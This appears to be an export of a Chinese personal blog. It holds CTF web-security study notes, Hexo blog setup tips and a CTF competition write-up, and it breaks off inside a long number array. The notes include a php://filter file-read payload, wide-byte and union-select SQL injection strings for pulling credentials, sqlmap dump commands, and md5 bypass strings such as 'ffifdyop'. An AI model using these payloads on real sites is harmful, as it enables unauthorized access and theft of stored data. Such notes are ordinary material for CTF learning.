<h1 id="4-include漏洞"><a href="#4-include漏洞" class="headerlink" title="4. include漏洞"></a>4. include漏洞</h1><p>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php)</span><br></pre></td></tr></table></figure>



<h1 id="5-代码审计"><a href="#5-代码审计" class="headerlink" title="5. 代码审计"></a>5. 代码审计</h1><p>需要多次动态调试来尝试，以及要关注里面出现的函数，出现在关键位置的函数一般都是有用的，搜索一下有没有相关的漏洞。</p>
<p>还有一些和数据处理有关的绕过，如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null，除了遇到时多百度之外，平时也需要多积累到时候才能想到。</p>
<p>还有GET参数构造的时候如果传入的是数组要记得加[]，？txt[]=[1,2,3]，如果填?txt=[1,2,3]似乎不会被当做array处理。</p>
<h1 id="6-编码"><a href="#6-编码" class="headerlink" title="6.编码"></a>6.编码</h1><p>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间。</p>
<p>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：</p>
<p><a href="https://emn178.github.io/online-tools/base64_decode.html">https://emn178.github.io/online-tools/base64_decode.html</a></p>
<p>可以解好多种加密，界面也很简洁。</p>
<h1 id="7-SQL注入"><a href="#7-SQL注入" class="headerlink" title="7.SQL注入"></a>7.SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a&gt;对一个注入语句记个笔记：</span><br><span class="line"> </span><br><span class="line">%df&#x27; union select 1,database() %23 %df&#x27; union select 1,string from sql5.key %23</span><br><span class="line"> </span><br><span class="line">%df是在编码为gbk的时候用于宽字节注入的；%23就是#，但是用#不能通过；还有可以直接用 union select 字段名 from 数据库名.表名 的方式获取字段的值。</span><br><span class="line"> </span><br><span class="line">b&gt;对用sqlmap进行手工注入的一些步骤记个笔记首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。</span><br><span class="line"> </span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump</span><br><span class="line"> </span><br><span class="line">–batch sqlmap不会询问你输入 全部默认确定</span><br><span class="line"> </span><br><span class="line">–level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段</span><br><span class="line"> </span><br><span class="line">–（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。</span><br><span class="line"> </span><br><span class="line">c&gt;还有一些用union select来获得数据库信息的，链接</span><br><span class="line"> </span><br><span class="line">http://www.2cto.com/article/201208/151503.html</span><br><span class="line"> </span><br><span class="line">讲得很全面。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1. @@version() MYSQL版本 </span><br><span class="line">2. @@database() 当前数据库 </span><br><span class="line">3. @@user() 当前用户 </span><br><span class="line">4. @@datadir 当前数据库路径 </span><br><span class="line">5. @@version_compile_os 操作系统版本</span><br><span class="line"> </span><br><span class="line">1. concat(str1,str2,...) 没有分隔符地连接字符串 </span><br><span class="line">2. concat_ws(separator,str1,str2,...) 用分隔符连接字符串 </span><br><span class="line">3. group_concat(str1,str2,...) 用逗号分隔字符串</span><br><span class="line"> </span><br><span class="line">1. 查数据库名，用户名 </span><br><span class="line">union select 1,2,concat(user(),database(),version()),4,……,N -- </span><br><span class="line">（最后--用于注释掉后面sql语句避免出错）得到数据库名 </span><br><span class="line">2. 查表名： union select group_concat(0x0a,table_name),2</span><br><span class="line"> from information_schema.tables </span><br><span class="line">where table_schema=库名十六进制# </span><br><span class="line">（库名十六进制可以用database()代替） </span><br><span class="line">3. 查列名 union select group_concat(0x0a,column_name)</span><br><span class="line">,2 from information_schema.columns </span><br><span class="line">where table_schema=database() and table_name=’users’# （</span><br><span class="line">也可以把表名改为十六进制编码0x7573657273） </span><br><span class="line">4. 查需要的信息（用户名和密码） </span><br><span class="line">union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,</span><br><span class="line">last_name,0x0a,user,0x0a,password,0x0a),</span><br><span class="line">2 from users #</span><br><span class="line"> </span><br><span class="line">总结的都比较散碎也比较基础，以后积累的多了一些之后再来继续补充。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&lt; 用这个表示\u003c   &gt;用这个表示 \u003e </p>
<p>[^]: </p>
<p>序列化学习网址</p>
<p><a href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、当在一个网页上找不到任何信息时，要查看他有没有robots.txt 或者前面的备份文件</span><br><span class="line"> </span><br><span class="line">2、extract() 函数从数组中将变量导入到当前的符号表。通俗的讲 就是可以将键变成变量名，键值可以变成变量名的值</span><br><span class="line"> </span><br><span class="line">sha1（）和md5（）都可以用数组绕过 而md5加密后判断相等时只要是0e字符串都会返回true</span><br><span class="line"> </span><br><span class="line">QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">3、file_get_contents（） 可以使用php://input传过去 再用post构建其里面的内容</span><br><span class="line"> </span><br><span class="line">include() 可以使用</span><br><span class="line"> </span><br><span class="line">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php) 也可以使用上述的方法。</span><br></pre></td></tr></table></figure>

<p>sql md5</p>
<p>看到这里的提交参数被MD5再组合进SQL查询语句，导致常规的注入手段几乎都失效了</p>
<p>但是注意到，MD5之后是hex格式，转化到字符串时如果出现’or’xxxx的形式，就会导致注入</p>
<p>这里提供一个字符串：ffifdyop</p>
<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
<p>转成字符串为’or’6�]��!r,��b</p>
<p>从而完成了注入</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>开启博客之旅</title>
    <url>/2021/12/30/test/</url>
    <content><![CDATA[<p>历经两天的博客搭建和美化，最终成功开启了博客之旅。下面我总结一下这次博客搭建的类型和作用，大家有意见或建议都可以在评论区提出来。</p>
<span id="more"></span>

<h1 id="博客的类型"><a href="#博客的类型" class="headerlink" title="博客的类型"></a>博客的类型</h1><p>本博客是采用云服务器，避免花大量资金购买服务器和备案，域名为阿里云购买的.top，将博客搭载到GitHub服务器上，采用hexo构建，主体采用next主题，并开启了看板娘功能(挺有趣的）。</p>
<h1 id="博客的作用"><a href="#博客的作用" class="headerlink" title="博客的作用"></a>博客的作用</h1><p>今后我将会在博客分享自己的学习经验和知识交流，也可以为广大网友解决问题，同时也会把我看到的觉得适合收藏的知识分享在这上面，此博客是深度交流沟通的网络新方式。</p>
<h1 id="开启博客之旅"><a href="#开启博客之旅" class="headerlink" title="开启博客之旅"></a>开启博客之旅</h1><p>让我们一起开启博客的旅途吧！！！</p>
<p><img src="/../../public/images/R-C.103add1996f9349bfd2fff6889db4164rik=Eafe60O3MNhfeQ&riu=http://img95.699pic.com/photo/50047/3787.jpg_wh860.jpg&ehk=8Ctrqqgwzar/SnM28+bVq48uCf5Eb4fzhazNY6yX1PE=&risl=&pid=ImgRaw&r=0"></p>
]]></content>
      <categories>
        <category>心得类</category>
      </categories>
      <tags>
        <tag>心得</tag>
      </tags>
  </entry>
  <entry>
    <title>博客制作遇到的问题</title>
    <url>/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>制作博客的过程中遇到的一部分问题及其解决办法</p>
<span id="more"></span>

<h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><p><code>hexo server</code> #启动本地服务器，用于预览主题。Hexo 会监视文件变动并自动更新，除修改站点配置文件外,无须重启服务器,直接刷新网页即可生效。</p>
<p><code>hexo server -s</code> #以静态模式启动</p>
<p><code>hexo server -p 5000</code> #更改访问端口 (默认端口为4000，’ctrl + c’关闭server)</p>
<p><code>hexo server -i IP地址</code> #自定义 IP</p>
<p><code>hexo clean</code> #清除缓存 ,网页正常情况下可以忽略此条命令,执行该指令后,会删掉站点根目录下的public文件夹</p>
<p><code>hexo g</code> #生成静态网页 (执行 $ <code>hexo g</code>后会在站点根目录下生成public文件夹, hexo会将”/blog/source/“ 下面的.md后缀的文件编译为.html后缀的文件,存放在”/blog/public/ “ 路径下)</p>
<p><code>hexo d</code> #自动生成网站静态文件，并将本地数据部署到设定的仓库(如github)</p>
<p><code>hexo init</code> 文件夹名称 #初始化XX文件夹名称</p>
<p><code>npm update hexo -g</code>#升级</p>
<p><code>npm install hexo -g</code> #安装</p>
<p><code>node-v</code> #查看node.js版本号</p>
<p><code>npm -v</code> #查看npm版本号</p>
<p><code>git --version</code> #查看git版本号</p>
<p><code>hexo -v</code> #查看hexo版本号</p>
<h1 id="简写指令"><a href="#简写指令" class="headerlink" title="简写指令"></a>简写指令</h1><p>hexo n “我的第一篇文章”<code>等价于</code>hexo new “我的第一篇文章”<code>还等价于</code>hexo new post “我的第一篇文章”<br>hexo p<code>等价于</code>hexo publish<br>hexo g<code>等价于</code>hexo generate<br>hexo s<code>等价于 </code>hexo server<br>hexo d<code>等价于</code>hexo deploy<br>hexo g -d<code>等价于</code>hexo generate –deploy<br>注: <code>hexo clean</code> 没有 简写, <code>git --version</code> 没有简写</p>
<h1 id="hexo-next设置网站运行时间"><a href="#hexo-next设置网站运行时间" class="headerlink" title="hexo+next设置网站运行时间"></a>hexo+next设置网站运行时间</h1><p><img src="/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/MB5B%25Y4VY%60%25V_WO7@1Y%5BW6B.jpg" alt="img"></p>
<p>找到<code>hexo\themes\next\layout\_partials\footer.swig</code>添加如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;&lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var now = new Date(); </span><br><span class="line">    function createtime() &#123; </span><br><span class="line">        var grt= new Date(&quot;08/10/2018 17:38:00&quot;);//在此处修改你的建站时间，格式：月/日/年 时:分:秒</span><br><span class="line">        now.setTime(now.getTime()+250); </span><br><span class="line">        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); </span><br><span class="line">        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); </span><br><span class="line">        if(String(hnum).length ==1 )&#123;hnum = &quot;0&quot; + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); </span><br><span class="line">        mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = &quot;0&quot; + mnum;&#125; </span><br><span class="line">        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); </span><br><span class="line">        snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = &quot;0&quot; + snum;&#125; </span><br><span class="line">        document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;本站已安全运行 &quot;+dnum+&quot; 天 &quot;; </span><br><span class="line">        document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">setInterval(&quot;createtime()&quot;,250);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>然后部署上传即可！</p>
<h1 id="博客不显示图片"><a href="#博客不显示图片" class="headerlink" title="博客不显示图片"></a>博客不显示图片</h1><p>在写博客的过程中难免需要插图，而有时候在插图时在博客中无法正常显示图片，这个时候就需要以下几个步骤：</p>
<h2 id="修改博客根目录中-config-yml文件的配置项post-asset-folder为true"><a href="#修改博客根目录中-config-yml文件的配置项post-asset-folder为true" class="headerlink" title="修改博客根目录中_config.yml文件的配置项post_asset_folder为true"></a>修改博客根目录中<code>_config.yml</code>文件的配置项<code>post_asset_folder</code>为<code>true</code></h2><blockquote>
<p>post_asset_folder: true</p>
</blockquote>
<p>完成此设置后，当你通过<code>hexo new 文件名</code>新建博客后，会产生一个和文件同名的文件夹。</p>
<p><img src="/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/webp.webp" alt=" "></p>
<h2 id="在博客根目录中下使用npm安装插件："><a href="#在博客根目录中下使用npm安装插件：" class="headerlink" title="在博客根目录中下使用npm安装插件："></a>在博客根目录中下使用npm安装插件：</h2><p>（回到博客根目录下在空白部分点右键，进入<code>git bush here</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p>完成以上步骤后就可以正常插图了！在这里再强调一下插图的语法是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![ ]( )</span><br></pre></td></tr></table></figure>

<p>然后选择对路径之后就会正常显示图片！</p>
<h1 id="Hexo博客添加搜索功能"><a href="#Hexo博客添加搜索功能" class="headerlink" title="Hexo博客添加搜索功能"></a>Hexo博客添加搜索功能</h1><p>安装插件，在博客根目录执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>修改根目录下的<code>_config.yml</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br><span class="line">  content: true</span><br></pre></td></tr></table></figure>

<p>修改主题配置文件./themes/next下的<code>_config.yml</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">	enable: true</span><br></pre></td></tr></table></figure>



<h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h1 id="时发生error：spawn-failed错误"><a href="#时发生error：spawn-failed错误" class="headerlink" title="时发生error：spawn failed错误"></a>时发生error：spawn failed错误</h1><p>首先用<code>ssh -T git@github.com</code>命令测试是否连接，如果不能连接的话，在存放key的目录下新建config文件</p>
<p><img src="/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/MO22Ie.png" alt="MO22Ie.png"></p>
<p>填入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User 你GitHub的邮箱</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure>

<p>如果可以正常连接的话，回到博客的根目录，打开_config.yml配置文件</p>
<p>修改以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line"></span><br><span class="line">type: git</span><br><span class="line"></span><br><span class="line">repo: https://github.com/yourname/yourname.github.io.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure>

<p>其中的repo修改为</p>
<p><code>git@github.com:yourname/yourname.github.io.git</code></p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>长安“战疫”网络安全卫士守护赛wp</title>
    <url>/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/</url>
    <content><![CDATA[<p>长安“战疫”网络安全卫士守护赛wp</p>
<span id="more"></span>

<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/1.png" alt=" "></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="【八卦迷宫】"><a href="#【八卦迷宫】" class="headerlink" title="【八卦迷宫】"></a>【八卦迷宫】</h3><p>按照迷宫走然后取字的拼音即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【朴实无华的取证】"><a href="#【朴实无华的取证】" class="headerlink" title="【朴实无华的取证】"></a>【朴实无华的取证】</h3><p>首先查看版本 imageinfo得到WinXPSP2x86</p>
<p>然后pslist，注意到<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
<p>然后</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-16418946537742.png" alt="img"></p>
<p>发现目录是桌面而并非Desktop，重新filescan一下，导出有用信息<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-16418946676494.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-r6LzEg9C-1641631822278)(mumuzi.assets/image-20220108103543050.png)]"></p>
<p>首先zip的密码是上面说的20211209</p>
<p>其次，得到的txt是加密函数，而密文在flag.png上。反过来写一个脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &#x27;fdcb[8ldq?zloo?fhuwdlqob?vxffhhg?lq?iljkwlqj?wkh?hslghplf]&#x27;</span><br><span class="line">for i in s:</span><br><span class="line">    if(ord(i)&gt;=ord(&#x27;a&#x27;) and ord(i)&lt;=ord(&#x27;w&#x27;)):</span><br><span class="line">        print(chr(ord(i)-3),end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;a&#x27;):</span><br><span class="line">        print(&#x27;x&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;b&#x27;):</span><br><span class="line">        print(&#x27;y&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;c&#x27;):</span><br><span class="line">        print(&#x27;z&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &quot;|&quot;):</span><br><span class="line">        print(&#x27;_&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(chr(ord(i)+32),end=&#x27;&#x27;)</span><br><span class="line"> #ca`_&#123;Xian_šill_certainl__s˜cceed_in_fighting_the_epidemic&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查了一下certainl后面应该还有个y</p>
<p>然后前面那个单词是will，后面那个单词是succeed，于是得到flag提交正确</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【无字天书】"><a href="#【无字天书】" class="headerlink" title="【无字天书】"></a>【无字天书】</h3><p>导出HTTP流，在导出的其中两个文件发现hex串，都是很明显的zip，hex–&gt;ascii，得到zip，打开zip得到两文件，一个key.ws一个flag.txt</p>
<p>ws很明显的whitespace，直接<a href="https://vii5ard.github.io/whitespace/%E5%BE%97%E5%88%B0key:XiAnWillBeSafe">https://vii5ard.github.io/whitespace/得到key:XiAnWillBeSafe</a></p>
<p>然后flag.txt很明显的SNOW</p>
<p>.\SNOW.EXE -p XiAnWillBeSafe -C .\flag.txt</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/e73eff4d3bef4ba0ae7cb1e9ff699660.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-5EINTl6Z-1641631822281)(mumuzi.assets/image-20220108104800137.png)]"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【西安加油】"><a href="#【西安加油】" class="headerlink" title="【西安加油】"></a>【西安加油】</h3><p>这道题我看了很久，在比赛中还是没有写出来。</p>
<p>查看流量包发现大量的base64串，导出http发现secret.txt，base64解码发现是zip，保存后打开发现是拼图</p>
<p>因为不知道大小，所以猜了一个12*4</p>
<p>命令montage *png -tile 12x4 -geometry 100x100+0+0 out2.png</p>
<p>然后用gaps</p>
<p>python3 gaps –image=out2.png –generations=10 –population=48 –size=100 –save</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-16418948450307.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-qmPkoNBX-1641631822284)(mumuzi.assets/image-20220108104953204.png)]"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;make_XiAN_great_Again&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【binary】"><a href="#【binary】" class="headerlink" title="【binary】"></a>【binary】</h3><p>文件头能看出来是class文件，直接扔jadx</p>
<p>数组转出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = [77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 